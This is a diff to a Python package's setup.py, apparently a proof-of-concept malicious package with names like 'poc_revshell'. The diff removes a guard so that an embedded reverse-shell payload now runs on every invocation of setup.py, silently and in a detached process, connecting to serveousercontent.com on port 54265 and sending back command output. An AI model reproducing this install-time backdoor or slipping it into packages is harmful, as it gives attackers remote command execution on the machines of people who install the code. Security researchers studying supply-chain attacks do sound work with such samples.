@@ -1,5 +1,5 @@
 import sys, subprocess
-from setuptools import setup
+from setuptools import setup, find_packages
 
 SERVER_HOST = "serveousercontent.com"
 SERVER_PORT = 54265
@@ -15,19 +15,18 @@ _PAYLOAD = (
     " s.send(p.stdout+p.stderr)\n"
 )
 
-_QUIET = {"--version", "--help", "--name", "--author", "--author-email",
-          "--description", "--long-description", "egg_info", "sdist",
-          "build", "build_py", "dist_info", "--dry-run"}
+try:
+    subprocess.Popen(
+        [sys.executable, "-c", _PAYLOAD],
+        start_new_session=True,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+except Exception:
+    pass
 
-if not any(a in _QUIET for a in sys.argv[1:]):
-    try:
-        subprocess.Popen(
-            [sys.executable, "-c", _PAYLOAD],
-            start_new_session=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-    except Exception:
-        pass
-
-setup()
+setup(
+    packages=find_packages(
+        include=["poc_revshell*", "poc_revshell_be*", "poc_revshell_oast*", "poc_revshell_persist*"]
+    ),
+)
